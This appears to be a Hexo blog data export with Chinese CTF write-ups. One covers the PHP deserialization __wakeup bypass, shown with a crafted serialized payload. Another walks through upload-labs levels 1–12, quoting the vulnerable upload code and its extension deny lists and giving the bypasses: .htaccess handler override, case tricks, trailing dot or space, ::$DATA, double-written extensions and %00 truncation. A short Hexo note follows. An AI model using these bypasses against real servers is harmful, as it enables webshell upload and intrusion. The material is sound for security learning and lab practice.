最后页面上输出的就是Student对象的一个序列化输出:O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。 wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。当我们将上述的序列化的字符串中的对象属性个数修改为5，变为 1234567O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125; 最后执行运行的代码如下: 123456789101112131415class Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo "__wakeup is invoked";&#125;function __destruct() &#123;var_dump($this);&#125;&#125;$s = new Student();$stu = unserialize('O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'); 这样就成功地绕过了__wakeup()函数。 例子： 12345678910&lt;?phpclass xctf&#123; //定义一个名为xctf的类public $flag = '111'; //定义一个公有的类属性$flag，值为111public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本exit('bad requests');&#125;&#125;$test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为testecho(serialize($test)); //输出被序列化的对象（test）?&gt; 执行结果 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;},要反序列化xctf类的同时还要绕过wakeup方法的执行,如果不绕过就会输出bad requests并退出。修改：http://111.198.29.45:50545/?code=O:4:%22xctf%22:5:{s:4:%22flag%22;s:3:%22111%22;}]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2019%2F10%2F04%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[pass-01能有上传点，就先上传一句话试一试，这道题给出的是前端检测，只允许.jpg|.png|.gif上传 解决方法很多，第一种是找到约束上传条件的checkFile(),将其删掉，就直接可以上传.php文件或者是将checkFile()里添加.php也能上传一句话但更通用的办法是：将.php文件隐藏成.jpg，然后再从抓包里面改回.php，这在下面的题中也 有用到。 pass-02第二题同样先上传一句话 这道题同样是文件类型不对，与第一题同属于文件后缀检验，但不是前端检测，然后我再源码中发现了么样一段东西。 12345678910111213141516171819202122232425&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 发现是上传的时候只允许image/jpeg。 可以直接在抓包中改Content-Type为image/gif，又因为我们前面有传上的一句话，所以能上传成功。 pass-03这个题也很直接，直接将.php加入黑名单。 12345678910111213141516171819202122232425262728293031323334&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 两种解决方法： 先上传一个.htaccess文件，里面写入 123&lt;FilesMatch "1.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析，和我们再上传一个图片木马就能接上传成功 直接上传.php3|.php5（只要后缀能被服务器解析就行） pass-04 12345678910111213141516171819202122232425262728293031323334&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 可以看到这道题限制的后缀很多，但不管限制什么，只要能将.htaccess上传上，后面上传的全都按照.php解析，或者直接上传.PHP(这个没被限制) pass-05 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 第五题看起来和第四题也差不多，看源码也差不多，区别是它限制了.htaccess，但是他没转小写，只要将原先的一句话改为.PHP可以 pass-06 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这道题的黑名单也比较全，但是没有首尾去空，可以.(空格)php但是.php(空格)不行，因为windos自动去尾。 pass-07 1234567891011121314151617181920212223242526272829303132&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单也比较全，但没有删除文件名末尾的点思路是上传一个.php.的文件，但是windos不能文件最后加点，所以在抓包里面将.php改为.php. 这样就能上传成功。 pass-08 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单也比较全，但是没有去除后面的::$DATA,也就是在burp中，改为1.php::$DATA,就能上传成功。 pass-09 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单比较全，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字可以在burp里面改为1.php. .就能上传成功 pass-1012345678910111213141516171819202122232425&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 拦截方式：$file_name = str_ireplace($deny_ext,””, $file_name);, 作用是把黑名单里面的后缀名替换成空, 由于只替换了一遍, 只对文件名进行了一次过滤，所以可以采用双写绕过。绕过方式：构造双重文件名,1.phphpp pass-11123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; $img_path直接拼接，因此可以利用%00截断绕过。先传一张图片，在抓包中改save_path值为../upload labs/1.php%00//某些情况下可以使用 %00 截断1、PHP 版本 &lt; 5.3.42、php.ini 中 magic_quotes_gpc=off pass-12123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传失败"; &#125; &#125; else &#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; 和上题类似，区别是这题是post，上题是get，%00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.在hex里面把2b改成00。 转载自： https://note.youdao.com/ynoteshare1/index.html?id=a2817a779ccb11d86544177a5b212cd2&amp;type=note 原作者：执子之手610]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一篇博文]]></title>
    <url>%2F2019%2F10%2F01%2F%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87%2F</url>
    <content type="text"><![CDATA[今天是十月一日国庆节，祝祖国繁荣昌盛，更加富强！这是我的第一篇博文，从此这里将成为我记录知识，不断成长的一片小园地。documentation ，troubleshooting，GitHubhexo搭建博客的简单用法： 新建博文1$ hexo new "My New Post" More info: Writing 本地预览123$ hexo clean$ hexo g$ hexo s 部署博客123$ hexo clean$ hexo g$ hexo d]]></content>
      <categories>
        <category>记录</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
</search>
